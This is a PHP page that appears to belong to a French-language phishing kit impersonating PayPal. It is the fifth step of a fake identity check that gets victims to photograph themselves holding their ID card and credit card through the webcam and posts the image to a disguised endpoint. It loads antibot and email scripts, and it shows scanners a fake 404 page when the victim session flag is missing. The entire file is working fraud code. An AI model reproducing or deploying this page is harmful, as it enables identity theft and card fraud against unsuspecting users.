<?php 

ob_start();
session_start();
if(isset($_SESSION['step_five'])){
include '../email.php';
include'../antibots.php';
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Confirmez votre identité </title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain biling-p vefic">
                <form method="POST" action="<?php echo 'serv5204.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
                    <center>
                        <span class="step" style="text-transform:uppercase"><b></b></span>
                        <h3>Confirmez votre identité</h3>
                    </center>
                    <p style="font-size:16px;color:#012169">Vos documents officiels d'identité nous aideront à valider votre identité.</p>
                    <p style="font-size:14px;color:#2d2d2d;font-weight:bold">Qu'est-ce que je dois faire pour confirmer mon identité?</p>
                    <ul>
                       <li>Prenez une photo avec votre carte d'identité et votre carte de crédit</li> 
                       <li>Le nom du titulaire et la carte d'identité doivent correspondre et être clairement visibles.</li>
                    </ul>
                    <a id="re" role="button" href="#opaopa">Revoir l'exemple</a>
                    <div id="opaopa">
                    <p style="font-size:14px;color:#2d2d2d;font-weight:bold">Voici un exemple pour la photo :</p>
                    <img id="width" src="../img/image.png" style="width:98%">
                    </div>
                    
                    <center>
                      <style>
                          video {
                              border:5px solid #0070ba;
                              border-radius: 3px;
                          }
                        </style>
                       <div id="my_camera" style="margin-top:20px;"></div>
                                              <div id="results"></div>

                        <input id="auto" class="bill_input btn-bill" type="button" value="Accéder à la caméra" onClick="setup();">
                        <input id="hdtwo" type="submit" value="Terminer la vérification" class="bill_input btn-bill">
                        <input id="hdone" class="bill_input btn-bill" type="button" value="Prendre une photo" onClick="take_snapshot()">
                        <input id="data" name="data" type="hidden" value="x">
                    </center>
                </form>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/plugins.js"></script>
             <script src="../js/webcam.min.js"></script>
             <style>
                 .votre {
                     margin: 10px;
                     font-weight: bold;
                 }
            </style>
<script>
$(document).ready(function() {
            $('#hdone,#hdtwo,#re').hide();
            $('#auto').on('click',function(){
            $('#hdone').fadeIn(50);
            $('#auto').fadeOut(50);
            $('#opaopa').fadeOut(50);
            $('#re').fadeIn(50);
            });
            $('#hdone').on('click',function(){
                                     $('#hdtwo').fadeIn(50) ;
                                $('#hdone').val('Prendre une autre photo')  
                                             });
    $('#hdtwo').on('click',function(){
        $('#my_camera').fadeOut(50);
    });
    $('#re').on('click',function(){
        $('#opaopa').fadeIn(50);
        $('#re').fadeOut(50);
    });
  });
    </script>
            	<script language="JavaScript">
		Webcam.set({
			width: $('#width').width(),
			height: 0.7585*$('#width').width(),
			image_format: 'jpeg',
			jpeg_quality: 100
		});
	</script>
            	<script language="JavaScript">
		function setup() {
			Webcam.reset();
			Webcam.attach( '#my_camera' );
		}
		
		function take_snapshot() {
			// take snapshot and get image data
			Webcam.snap( function(data_uri) {
				// display results in page
				document.getElementById('results').innerHTML = 
					'<p class="votre">Votre photo:</p>' + 
					'<img style="border:5px solid #0070ba;border-radius: 3px;" src="'+data_uri+'"/>';
                $('#data').val(data_uri);
			});
		}
	</script>
        </body>
    </html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>